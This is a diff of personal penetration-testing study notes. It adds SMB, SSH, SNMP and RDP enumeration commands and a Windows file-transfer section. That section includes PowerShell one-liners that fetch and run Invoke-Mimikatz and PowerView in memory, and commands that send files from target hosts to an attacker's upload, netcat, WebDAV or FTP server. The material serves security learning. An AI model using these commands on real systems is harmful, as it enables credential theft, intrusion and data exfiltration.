@@ -25,9 +25,13 @@
 	- [WinRM](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#winrm)
 	- [WMI](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#wmi)
 	- [LDAP](https://github.com/carnifex17/Cybersecurity-Notes/blob/main/Penetration%20Testing%20Notes.md#ldap)
-
+- [FILE TRANSFERS]()
+	- [Windows File Transfer]()
+	
+	
+	
 ---
-## Footprinting
+# Footprinting
 ---
 ### Our goal is not to get at the systems but to find all the ways to get there.
 ---
@@ -121,6 +125,11 @@ In a network,using Samba, each host participates in the same `workgroup`. A work
 ```bash
 smbclient -N -L //{IP}
 ```
+**OR**
+```bash
+smbclient -U username \\\\{IP}\\share
+```
+
 - `-N` is for **null session**, which is anonymous access without the input user/pass. And `-L` is to list all shares.
 - For basic interaction with share, you would need only these commands:
 	- `help` to have list of available commands
@@ -246,6 +255,12 @@ cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'
 ```bash
 ssh -v carnifex17@{IP} -o PreferredAuthentications=password
 ```
+3. If you have access to `/.ssh/authorized_keys` file, then put your **public key** inside of this file, and then you could log in without password
+4. If you have access to some **private key** you could download it and use, but check if permissions to private key is **chmod 600**
+```bash
+ssh -i /path/to/private/keyfile user@hostname
+```
+
 ---
 
 ## SMTP
@@ -419,7 +434,7 @@ dnsenum --dnsserver {IP} --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/SecLi
 An SNMPwalk is an application that repeatedly sends out GetNextRequest to collect information about different OIDs. The application bundles together multiple SNMP commands and lets you collect information from multiple devices without having to type out individual commands for all OIDs. It can help you identify devices in the network that are not working. By performing an SNMP walk, you can find out the entire list of devices in your network that supports SNMP and form a library of MIBs.
 
 ### Versions
-1. `SNMPv1` - No authentification
+1. `SNMPv1` - No authentification. For SNMPwalk use `-v1` argument to use.
 2. `SNMPv2` - No encryption. Community strings can be seen as passwords that are used to determine whether the requested information can be viewed or not. Also could be called as `v2c`, which means**v2 community** In `v2c` can be intercepted.
 3. `SNMPv3` - Finally now it has authentification and encryption. That's a won
 
@@ -438,19 +453,17 @@ cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
 ```bash
 snmpwalk -v2c -c public 10.129.14.128
 ```
-2. OneSixtyOne (SNMP scanner). Can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator
+2. OneSixtyOne (`SNMP scanner`). Can be used to brute-force the names of the community strings since they can be named arbitrarily by the administrator
 ```bash
 onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt {IP}
 ```
-<!--
-3. Braa. Once we know a community string, we can use it with braa to brute-force the individual OIDs and enumerate the information behind them.
+3. Braa. Once we know a community string, we can use it with braa to brute-force the individual `OIDs` and enumerate the information behind them.
 ```bash
-> braa <community string>@<IP>:.1.3.6.*
-> braa public@10.129.14.128:.1.3.6.*
+> braa <community string>@{IP}:.1.3.6.*
 ```
-Not Certain about this part. Need to do a bit searching for it
--->
+
 ---
+
 ## MySQL
 **MySQL is an open-source SQL relational database management system developed and supported by Oracle.** A database is simply a structured collection of data organized for easy use and retrieval. The database system can quickly process large amounts of data with high performance. Default MySQL port is 3306. The most important databases fot the MySQL are the `system schema (sys)` and `information schema (information_schema)`. The system schema contaions tables, information, and metadata necessary for management. The **information schema** contains metadata which mainly retrieved from th system **schema database**.
 ### Dangerous Settings
@@ -737,7 +750,7 @@ nmap -sV -sC {IP} -p3389 --script rdp*
 ```
 3. Initiate an RDP Session via xfreerdp(or Reminna with GUI)
 ```bash
-xfreerdp /u:carnifex17 /p:"S3cr3t!" /v:{IP}
+xfreerdp /u:carnifex17 /p:"S3cr3t!" /v:{IP} /cert:ignore /d:DOMAIN
 ```
 
 ---
@@ -764,33 +777,6 @@ evil-winrm -i {IP} -u carnifex17 -p S3cr3t!
 
 ```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ---
 
 ## LDAP
@@ -802,4 +788,209 @@ evil-winrm -i {IP} -u carnifex17 -p S3cr3t!
 - `o` - o subclass is one of the most general subclasses listed in the DN, and it is usually where LDAP starts when it runs a search
 - `ou` - Organizational Unit. Subclass of o. Mostly seen as ou=users or/and ou=group, with each containing a list of user accounts or groups. 
 - `cn` - Common Name. Used to identify the name of a group or user account.
+
 ---
+# File Transfers
+---
+## Windows File Transfers
+
+### PowerShell Base64 Encode & Decode
+1. **Check SSH Key MD5 Hash**
+```bash
+md5sum id_rsa
+```
+2. **Encode SSH Key to Base64**
+```bash
+cat id_rsa | base64 -w 0;echo
+
+justimaginethisissomerandomhashbecauseyoudontcareandidontcare=
+```
+3. **Decoding SSH Key on Windows machine**
+```powershell
+PS C:\carnifex17> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("justimaginethisissomerandomhashbecauseyoudontcareandidontcare="))
+```
+4. **Confirming the MD5 Hashes Match**
+```powershell
+Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
+```
+- **Note**: It's not always possible to use this method because cmd.exe has a maximum string length of 8191 characters. And also web shell may error because of this large strings. 
+#### Opposite Operation
+I explained above how to do encoding in **Linux** and decoding in **Powershell**, now I'll explain opposite: Encode in **Powershell** and decode in **Linux**
+1. **Encode File Using Powershell**
+```powershell
+PS C:\carnifex17> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte)) # Encode
+PS C:\carnifex17> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash # Get hash
+```
+2. **Decode Base64 String in Linux**
+```bash
+echo justimaginethisissomerandomhashbecauseyoudontcareandidontcare= | base64 -d > hosts
+```
+3. **Check Hash**
+```bash
+md5sum hosts
+```
+
+### Powershell Web Downloads
+ In any version of **PowerShell**, the **System.Net.WebClient** class can be used to download a file over `HTTP, HTTPS or FTP`. The following [table](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource.
+ 1. **File Download**
+```powershell
+#Syntax: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+PS C:\carnifex17> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
+
+#Syntax: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
+PS C:\carnifex17> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')
+```
+ 2. **PowerShell DownloadString - Fileless Method**. Fileless attacks work by using some operationg system functions to download the payload and execute it directly. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias **IEX**
+```powershell
+PS C:\carnifex17> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+ ```
+ 3. **PowerShell Invoke-WebRequest**
+```powershell
+PS C:\carnifex17> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
+```
+#### Common Errors
+- **Internet Explorer Error**
+```powershell
+PS C:\carnifex17> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
+
+Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
+At line:1 char:1
++ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
++ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+
+PS C:\carnifex17> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
+```
+- **SSL/TLS Untrusted certificate error**
+```powershell
+PS C:\carnifex17> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+```
+
+### PowerShell Web Uploads
+PowerShell doesn't have a built-in upload fucntions, so we need to use **Invoke-WebRequest**.  or **Invoke-RestMethod.** Also we can use uploadserver module for Python, to install it we should use:
+```bash
+pip3 install uploadserver
+```
+
+- **Turn On Web Server with Upload**
+```bash
+python3 -m uploadserver
+```
+
+1. **PowerShell Script to Upload a File to Python Upload Server**
+```powershell
+PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
+PS C:\htb> Invoke-FileUpload -Uri http://{IP}:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+```
+
+2. **PowerShell Base64 Web Upload**. Convert file to base64 and send it using Invoke-WebRequest with POST method. 
+```powershell
+PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
+PS C:\htb> Invoke-WebRequest -Uri http://{IP}:8000/ -Method POST -Body $b64
+```
+```bash
+nc -lvnp 8000
+```
+```bash
+echo <base64> | base64 -d -w 0 > hosts
+```
+
+### SMB Downloads
+1. **Create the SMB Server**
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare
+```
+2. **Copy a File from the SMB Server**
+```powershell
+C:\carnifex17> copy \\192.168.220.133\share\nc.exe
+```
+- But in some scenarios there would be an error, which forbids us unauthentificated guest access, so we could creat a smb server with **authentification**
+1. **Create the SMB Server with a Username and Password**
+```bash
+sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+```
+2. **Mount the SMB Server with Username and Password**
+```powershell
+C:\carnifex17> net use n: \\192.168.220.133\share /user:test test
+```
+
+### SMB Uploads
+****
+SMB Uploads will be more tricky because companies usually block uploads to SMB, cause it could cause a huge problem. BUUUT we could use HTTP or HTTPS protocol in return. It's because when you use SMB, it will first attempt to connect using SMB protocol, and if there's no SMB share available, it'll try to connect using HTTP. But for this we need WebDav protocol, it enables a webserver to behave like a fileserver, which we need. First you need to install it
+```bash
+sudo pip install wsgidav cheroot
+```
+1. **Using the WebDav Python module**
+```bash
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+2. **Connecting to the Webdav Share**. DavWWWRoot isn't a folder, it's a special keyword that tells WebDAV that we are connection to the root of WebDav server. You could use any existing directory when you are connecting, as example `sharefolder`
+```powershell
+C:\htb> dir \\{IP}\DavWWWRoot
+```
+3. **Uploading Files using SMB**
+```powershell
+C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\{IP}\DavWWWRoot\
+C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\{IP}\sharefolder\
+```
+
+### FTP Downloads
+- **Installing FTP Server python3 module**
+```bash
+sudo pip3 install pyftpdlib
+```
+1. **Setting up a Python3 FTP Server**
+```bash
+sudo python3 -m pyftpdlib --port 21
+```
+2. **Transferring Files from an FTP Server Using Powershell**
+```powershell
+PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://{IP}/file.txt', 'C:\Users\Public\ftp-file.txt')
+```
+3. **Create a Command File for the FTP Client and Download the Target File**
+```bash
+C:\carnifex17> echo open {IP} > ftpcommand.txt
+C:\carnifex17> echo USER anonymous >> ftpcommand.txt
+C:\carnifex17> echo binary >> ftpcommand.txt
+C:\carnifex17> echo GET file.txt >> ftpcommand.txt
+C:\carnifex17> echo bye >> ftpcommand.txt
+C:\carnifex17> ftp -v -n -s:ftpcommand.txt
+ftp> open {IP}
+Log in with USER and PASS first.
+ftp> USER anonymous
+
+ftp> GET file.txt
+ftp> bye
+
+C:\htb>more file.txt
+This is a test file
+```
+
+### FTP Uploads
+For this we would also use `peftpdlib` but we need to specify the option --write to allow clients to upload files to our attack host.
+1. **Starting FTP Server**
+```bash
+sudo python3 -m pyftpdlib --port 21 --write
+```
+2. **Powershell Upload File**
+```powershell
+PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://{IP}/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
+```
+3. **Create a Command File for the FTP Client to Upload a File**
+```powershell
+C:\htb> echo open 192.168.49.128 > ftpcommand.txt
+C:\htb> echo USER anonymous >> ftpcommand.txt
+C:\htb> echo binary >> ftpcommand.txt
+C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
+C:\htb> echo bye >> ftpcommand.txt
+C:\htb> ftp -v -n -s:ftpcommand.txt
+ftp> open 192.168.49.128
+
+Log in with USER and PASS first.
+
+
+ftp> USER anonymous
+ftp> PUT c:\windows\system32\drivers\etc\hosts
+ftp> bye
+```
